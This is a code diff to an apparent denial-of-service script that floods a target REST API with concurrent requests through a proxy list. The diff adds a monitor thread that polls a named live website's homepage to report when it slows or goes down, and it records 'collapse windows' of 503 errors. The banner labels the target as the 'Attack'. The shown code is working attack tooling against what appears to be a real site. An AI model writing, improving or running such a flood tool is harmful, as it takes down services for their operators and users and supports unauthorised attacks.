@@ -73,11 +73,45 @@ def fire():
     except:
         return 0, time.time()-t0
 
-G="\033[0;32m";R="\033[0;31m";Y="\033[0;33m";C="\033[0;36m";W="\033[0m";B="\033[1m"
-print(f"\n{B}{'═'*60}{W}")
-print(f"  REST API Burst — {CONC} concurrent | {len(PROXIES)} CF-verified proxies")
-print(f"  Target: {TARGET}")
-print(f"  Ctrl+C to stop\n{B}{'═'*60}{W}\n")
+MONITOR_URL = "https://metoo-shatkin.com/"
+MONITOR_INTERVAL = 4
+
+G="\033[0;32m";R="\033[0;31m";Y="\033[0;33m";C="\033[0;36m";W="\033[0m";B="\033[1m";M="\033[0;35m"
+
+# Shared monitor state
+mon = {"ms": 0, "code": 0, "tag": "...", "color": W}
+mon_lock = threading.Lock()
+
+def monitor_loop():
+    while True:
+        t0m = time.time()
+        try:
+            r = requests.get(MONITOR_URL, timeout=12, verify=False,
+                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"})
+            ms = (time.time()-t0m)*1000
+            code = r.status_code
+            if code == 503:   color, tag = R, "⚠ DOWN"
+            elif ms < 800:    color, tag = G, "FAST"
+            elif ms < 2000:   color, tag = Y, "SLOW"
+            else:             color, tag = R, "DEGRADED"
+        except:
+            ms = (time.time()-t0m)*1000
+            code, color, tag = 0, R, "TIMEOUT"
+        with mon_lock:
+            mon["ms"] = ms; mon["code"] = code
+            mon["tag"] = tag; mon["color"] = color
+        time.sleep(MONITOR_INTERVAL)
+
+threading.Thread(target=monitor_loop, daemon=True).start()
+time.sleep(1)  # let monitor get first reading
+
+print(f"\n{B}{'═'*72}{W}")
+print(f"  REST API Burst — {CONC} concurrent | {len(PROXIES)} proxies")
+print(f"  Attack : {TARGET}")
+print(f"  Monitor: {MONITOR_URL}")
+print(f"  Ctrl+C to stop\n{B}{'═'*72}{W}")
+print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'401':>4} {'403':>4} {'503':>4} {'ERR':>4} {'AVG':>7}  {'HOMEPAGE RESPONSE'}")
+print(f"  {'─'*70}")
 
 burst=0; total=0; total_503=0; collapses=[]; t0=time.time()
 try:
@@ -93,13 +127,18 @@ try:
         c503=codes.count(503); cerr=codes.count(0)
         avg=sum(times)/len(times)
         total_503+=c503
-        if c503>0: collapses.append(ts); st=f"{R}{B}⚠ SERVER DOWN {c503}x503{W}"
-        elif avg>8: st=f"{Y}HEAVY DEGRADED{W}"
-        elif avg>4: st=f"{Y}DEGRADED{W}"
-        else: st=f"{G}RESPONDING{W}"
-        print(f"  {C}[{burst:>4}]{W} {ts} 200={c200} 401={c401} 403={c403} 503={c503} ERR={cerr} avg={avg:.2f}s {st}")
+        if c503>0:   collapses.append(ts); st=f"{R}{B}⚠ SERVER DOWN{W}"
+        elif avg>8:  st=f"{Y}HEAVY DEGRADED{W}"
+        elif avg>4:  st=f"{Y}DEGRADED{W}"
+        else:        st=f"{G}OK{W}"
+        with mon_lock:
+            mms=mon["ms"]; mcode=mon["code"]; mtag=mon["tag"]; mcol=mon["color"]
+        mon_str = f"{mcol}{B}{mms:>7.0f}ms{W} {mcol}{mtag}{W} (HTTP {mcode})"
+        print(f"  {C}[{burst:>4}]{W} {ts} {c200:>4} {c401:>4} {c403:>4} {R if c503 else W}{c503:>4}{W} {cerr:>4} {avg:>6.2f}s  {st}  │ {mon_str}")
 except KeyboardInterrupt:
-    print(f"\n  Bursts:{burst} Reqs:{total} 503s:{total_503} Runtime:{time.time()-t0:.0f}s")
+    elapsed = time.time()-t0
+    print(f"\n  {'─'*70}")
+    print(f"  Bursts:{burst}  Reqs:{total}  503s:{total_503}  Runtime:{elapsed:.0f}s")
     if collapses:
         print(f"  {R}Collapse windows: {', '.join(collapses)}{W}")
     print()
